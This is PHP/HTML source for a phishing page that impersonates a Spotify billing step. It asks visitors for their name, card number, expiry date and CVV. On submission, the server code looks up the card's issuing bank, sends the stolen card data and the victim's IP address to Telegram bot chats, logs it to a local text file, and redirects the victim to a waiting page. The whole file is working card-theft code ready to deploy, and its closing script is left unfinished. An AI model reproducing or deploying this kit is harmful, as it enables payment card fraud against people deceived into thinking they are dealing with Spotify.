<?php
include "id.php";
if(isset($_POST['okbb'])){
    $F=$_POST["Cardholder"];
    $L=$_POST['cardn'];
    $C=$_POST['Expiry'];
    $PH=$_POST["cvv2"];
    $ip = getenv("REMOTE_ADDR");
    $bin        = str_replace(' ', '', $_POST['cardn']);
    $bin        = substr($bin, 0, 6);
    $getdetails = 'https://lookup.binlist.net/' . $bin;
    $curl       = curl_init();
    curl_setopt($curl, CURLOPT_URL, $getdetails);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    $content    = curl_exec($curl);
    curl_close($curl);
    $details  = json_decode($content);
    $_SESSION['_namebank_'] = $namebank   = $details->bank->name;
    $ip = getenv("REMOTE_ADDR");
    $message=" -------  𝒢𝑒𝓃𝒾𝓊𝓈  𝒮𝓅𝑜𝓉𝒾𝒻𝓎 𝒞𝒞 -------"."\n"."𝐹𝓊𝓁𝓁 𝓃𝒶𝓂𝑒 :  ".$F."\n"."𝒞𝒞 𝒩𝓊𝓂𝒷𝑒𝓇 :   ".$L."\n"."𝑒𝓍𝓅𝓇 𝒹𝒶𝓉𝑒 :   ".$C."\n"."𝒞𝒱𝒱 :   ".$PH."\n"."𝒯𝓎𝓅𝑒 𝒞𝒞 𝐵𝒶𝓃𝓀 :"."\n".$_SESSION['_namebank_']."\n".$ip."\n"."------------  𝒮𝓅𝑜𝓉𝒾𝒻𝓎  -------------";
    $user_ids=$id;
    foreach($user_ids as $user_id) {
    $url='https://api.telegram.org/bot'.$token.'/sendMessage';
    $data=array('chat_id'=>$user_id,'text'=>$message);
    $options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
    $context=stream_context_create($options);
    $result=file_get_contents($url,false,$context);
    }
    $myfile = fopen("noni.txt", "a+");
    $txt = $message;
    fwrite($myfile, $txt);
    fclose($myfile);
    include "antics.php";
    HEADER("Location: wait2.php");
    }

    ?>
<html style="display: block;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <meta name="apple-mobile-web-app-title" content="Disney+">
    <meta name="theme-color" content="#ffffff">
    <meta name="msapplication-TileColor" content="#ffffff">
    <link rel="stylesheet" type="text/css" href="../style/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="../style/app_styles_bundle.css">
    <link rel="stylesheet" type="text/css" href="../style/main.css">
    <link rel="stylesheet" type="text/css" href="../style/react.css">
    <link rel="stylesheet" type="text/css" href="../style/card.css">

    <title>Billing - Spotify</title>

    <link rel="stylesheet" type="text/css" href="../style/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="../style/app_styles_bundle.css">
    <link rel="stylesheet" type="text/css" href="../style/main.css">
    <link rel="stylesheet" type="text/css" href="../style/react.css">
    <link rel="stylesheet" type="text/css" href="../style/card.css">
    <style>
        html {
            display: none;
        }
    </style>
    

<script>
    document.getElementById('billing-card-exp-date').addEventListener('input', function (e) {
    var input = e.target.value;

    // Retirer tous les caractères non numériques
    var numInput = input.replace(/\D/g, '');

    // Sépare le mois et l'année si la longueur du nombre est plus que 2
    if (numInput.length > 2) {
        e.target.value = numInput.substring(0, 2) + '/' + numInput.substring(2, 4);
    } else {
        e.target.value = numInput;
    }
});
</script>
    
    
</head>

<body id="app_index" class="js-focus-visible">



    <div id="webAppRoot" data-reactroot="">
        <div id="app_body_content" data-testid="adult-enabled-profile">
            <div class="sc-esoVGF cNOTUj"></div>
            <div id="hudson-wrapper" class="sc-ZUflv kcCFNP video_view--hidden  ">
                <div class="sc-hPeUyl bhhZhW hudson-container">
                    <div data-testid="" class="sc-hSdWYo dfLgnK"><img alt="" aria-hidden="true" src="../img/icon-loader-32@3x.png" class="sc-eHgmQL jstxUN"></div>
                </div>
            </div>
            <div id="webAppHeader" class="onboarding">
                <div class="sc-iuJeZd hcKoaM">
                   <!-- Move the logo inside a header container -->
        <header class="header-container">
            <img src="./img/ico/logo.png" id="logo" class="logo" style="
    width: 120px;
">
        </header>
            </div>
            <div id="webAppScene">
                <div id="app_scene_content">
                    <div id="app-background" class="sc-ekHBYt eIfKUM"></div>
                    <main class="onboarding" id="onboarding_index" style="top: 0px;">
                        <div class="onboarding-wrapper">
                            <!-- Wrap the form in a white container with width: 580px -->
                        <div class="form-container" style=" background-color: black; padding: 50px; margin: 0 auto; border-radius: 10PX;">
                        <form id="dssLogin" name="dssLogin"  method="post">
                                <div color="#cacaca" font-size="12px" class="sc-kAzzGY ftHOpF" style="font-weight: 600; color: #fff; margin: 0px; padding: 6px 0px 0px 4px;">STEP 2 OF 3</div>
                                <br>
                                <h3 color="white" style="color: #fff; margin: 0px; padding: 0px 0px 24px;" class="sc-gZMcBi jhLoHG">Billing data</h3>
                                <div data-gv2containerkey="paymentInfo">
                                    <div>
                                        
                                            <fieldset class="sc-jxGEyO gLFPOz" style="margin-bottom: 20px;">

                                                <div data-testid="" class="sc-gNJABI ipGQYr"><input aria-label="Nom sur la carte" id="billing-card-name" maxlength="1000" name="Cardholder" placeholder="full Name" type="text" class="sc-kjoXOD eUqZyU sc-cqPOvA hgwRqC" required="">
                                                    <div class="sc-fjhmcy fmWZhI input-label" for="billing-card-name">
                                                        <font style="vertical-align: inherit;">
                                                            <font style="vertical-align: inherit;">NAME ON THE CARD</font>
                                                        </font>
                                                    </div>
                                                </div>
                                            </fieldset>
                                            <fieldset class="sc-jxGEyO fjctja sc-gCKARq ensgGZ" style="margin-bottom: 20px;">
                                         <div data-testid="" class="sc-gNJABI ipGQYr"><input style="" id="card_number" maxlength="16" name="cardn" placeholder="XXXXXXXXXXXXXXXX" type="tel" class="sc-kjoXOD eUqZyU sc-cqPOvA bPLfKs" value="" required="">
                                     <div id="cardnumbererror" color="red" font-size="12px" style="color: red; margin: 0px; padding: 6px 0px 0px 4px;" class="sc-kAzzGY ftHOpF"></div>
                                         <div class="sc-fjhmcy fmWZhI input-label" for="billing-card-number">
                                                        <font style="vertical-align: inherit;">
                                                            <font style="vertical-align: inherit;">Card number</font>
                                                        </font>
                                                    </div>
                                                </div>
                                            </fieldset>
                                            <div class="card-row">
                                                <fieldset class="sc-jxGEyO gLFPOz card-exp" style="margin-bottom: 20px;">
                                                    <div data-testid="" class="sc-gNJABI ipGQYr"><input aria-label="Date d&#39;expiration" id="billing-card-exp-date" maxlength="5" name="Expiry" placeholder="MM/YY" type="tel" class="sc-kjoXOD eUqZyU sc-cqPOvA hgwRqC" value="" required="">
                                       <div id="expiryerror" color="red" font-size="12px" style="color: red; margin: 0px; padding: 6px 0px 0px 4px;" class="sc-kAzzGY ftHOpF"></div>

                                                        <div class="sc-fjhmcy fmWZhI input-label" for="billing-card-exp-date">
                                                            <font style="vertical-align: inherit;">
                                                                <font style="vertical-align: inherit;">EXPIRATION DATE</font>
                                                            </font>
                                                        </div>
                                                    </div>
                                                </fieldset>
                                                <div class="csc-container show-billing">
                                                    <fieldset class="sc-jxGEyO gLFPOz sc-fjdPjP iySyfU" style="margin-bottom: 20px;">
                                                        <div data-testid="" class="sc-gNJABI ipGQYr"><input aria-label="Entrez votre CVV de carte de crédit." id="billing-card-CSC" maxlength="4" name="cvv2" placeholder="CVV" type="tel" class="sc-kjoXOD eUqZyU sc-cqPOvA hgwRqC" value="" required="">
                                                            <div class="sc-fjhmcy fmWZhI input-label" for="billing-card-CSC">
                                                                <font style="vertical-align: inherit;">
                                                                    <font style="vertical-align: inherit;">SECURITY CODE</font>
                                                                </font>
                                                            </div>
                                                        </div>
                                                    </fieldset>
                                                </div>
                                            </div>
                                    </div>
                                    <hr class="divider">
<div color="#cacaca" font-size="12px" class="sc-kAzzGY ftHOpF" style="text-align: left; color: #fff; margin: 0px; padding: 0px 0px 0px 4px;">Spotify performs a temporary authentication on your card to verify it. This is an authorization only and NOT a fee.</div>
<div color="#cacaca" font-size="12px" class="sc-kAzzGY ftHOpF" style="text-align: left; color: #fff; margin: 0px; padding: 6px 0px 15px 4px;">You can check your Renewel date or cancel at anytime via your account page. No partial refund. Terms apply.</div>
<button aria-label="Accepter et continuer" data-testid="login-continue-button" role="button" kind="primary" value="submit" class="sc-gPEVay jOqQLP" id="" type="submit" name="okbb">CONTINUE</button>
</form>    


                                                                                   <style>
                                
            .spinner {
    margin:0px auto ;            
    border: 4px solid rgba(0, 0, 0, 0.1);
    border-top: 4px solid #fff;
    border-radius: 50%;
    width: 20px;
    height: 20px;
    animation: spin 1s linear infinite;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}


                                
                            </style>          
                                    
<script>
    // Function to allow only numeric input in specified fields
    function allowOnlyNumericInput(inputField) {
        inputField.addEventListener('input', function () {
            this.value = this.value.replace(/\D/g, ''); // Remove non-numeric characters
        });
    }

    // Function to format the expiry date (MM/YY) and perform validation
    function formatExpiry(input) {
        input.addEventListener('input', function () {
            const trimmed = this.value.replace(/\D/g, '');
            const month = trimmed.slice(0, 2);
            const year = trimmed.slice(2, 4);

            if (trimmed.length === 2 && Number(month) > 12) {
                this.value = '12/';
            } else if (trimmed.length === 2) {
                this.value = `${month}/`;
            } else if (trimmed.length > 2) {
                this.value = `${month}/${year}`;
            } else {
                this.value = month;
            }
        });
    }

    // Function to perform Luhn algorithm check for card number validation
    function luhnCheck(cardNumber) {
        let sum = 0;
        let shouldDouble = false;

        for (let i = cardNumber.length - 1; i >= 0; i--) {
            let digit = parseInt(cardNumber.charAt(i));

            if (shouldDouble) {
                if ((digit *= 2) > 9) digit -= 9;
            }

            sum += digit;
            shouldDouble = !shouldDouble;
        }

        return sum % 10 === 0;
    }

    

                                    
                                    
                                    
                                </div></form>
                    </div></div></main>
                    </div>
                </div>
                <div tabindex="0" class="sc-eAKXzc fcUHFZ">
                    <div id="cta-toast" class="sc-bfYoXt gCjimr"><button aria-label="" data-testid="" role="button" kind="primary" class="sc-gPEVay edYBEy sc-gbOuXE bcVAiB" id="" type="submit">GET SPOTIFY</button></div>
                </div>
                <div id="webAppFooter">
                <footer class="sc-fgfRvd kAzEpp" style="margin-top: 100px;" id="footer">
                    <div class="sc-gpHHfC fohBoY"><button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Privacy Policy</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Cookie Terms</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Data Rights</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">About Spotify</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Subscription terms and conditions</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Help</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Compatible devices</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">About Spotify</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Interest-Based Ads</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Manage your preferences</button>
                    </div>
                    <div class="sc-gVyKpa kOxdJt">©Spotify. All rights reserved.</div>
                </footer>
            </div>
        </div>
    </div>


</div></body></html>
<?php
ob_end_flush();
?>